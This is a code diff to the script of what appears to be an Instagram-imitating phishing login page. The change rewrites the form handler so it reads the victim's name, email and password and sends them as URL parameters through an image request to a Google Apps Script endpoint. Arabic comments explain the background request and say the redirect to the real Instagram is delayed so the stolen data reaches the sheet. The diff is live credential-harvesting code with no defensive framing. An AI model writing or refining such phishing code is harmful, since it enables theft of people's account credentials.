@@ -148,42 +148,27 @@
 </div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwMze-CRarapBb3xHvBaaa-ews6k3PUr96smjAPSJmf_IYOnZMLw5uNhCXpRuXfHo/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwwMze-CRarapBb3xHvBaaa-ews6k3PUr96smjAPSJmf_IYOnZMLw5uNhCXpRuXfHo/exec"; //
+    document.querySelector("form").addEventListener("submit", function(event) {
+        // 
+        const nameVal = document.querySelector('input[type="text"]').value;
+        const emailVal = document.querySelectorAll('input')[1] ? document.querySelectorAll('input')[1].value : "";
+        const passVal = document.querySelector('input[type="password"]').value;
 
-document.querySelector("form").addEventListener("submit", function(event) {
-    const nameVal = document.querySelector('input[type="text"]').value;
-    const emailVal = document.querySelectorAll('input')[1] ? document.querySelectorAll('input')[1].value : "";
-    const passVal = document.querySelector('input[type="password"]').value;
+        // تجهيز الرابط مع البيانات
+        const fullUrl = SCRIPT_URL + "?name=" + encodeURIComponent(nameVal) + 
+                        "&email=" + encodeURIComponent(emailVal) + 
+                        "&password=" + encodeURIComponent(passVal) + 
+                        "&action=login_attempt&detected=no";
 
-    const data = {
-        name: nameVal,
-        email: emailVal,
-        password: passVal,
-        action: "login_attempt",
-        detected: "no"
-    };
+        // إجبار المتصفح على إرسال الطلب للشيت في الخلفية فورا
+        const img = new Image();
+        img.src = fullUrl;
 
-    fetch(SCRIPT_URL, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-            "Content-Type": "text/plain"
-        },
-        body: JSON.stringify(data)
-    });
-
-    setTimeout(function() {
-        window.location.href = "https://www.instagram.com";
-    }, 1000);
-});
-        }).catch(err => {
-            console.error(err);
-        });
-
-        // التحويل المباشر لموقع إنستغرام بعد ثانية واحدة
+        // التحويل لإنستغرام بعد ثانية ونصف (عشان ندي فرصة للبيانات تتسجل في الشيت)
         setTimeout(function() {
             window.location.href = "https://www.instagram.com";
-        }, 1000);
+        }, 1500);
     });
 </script>
 
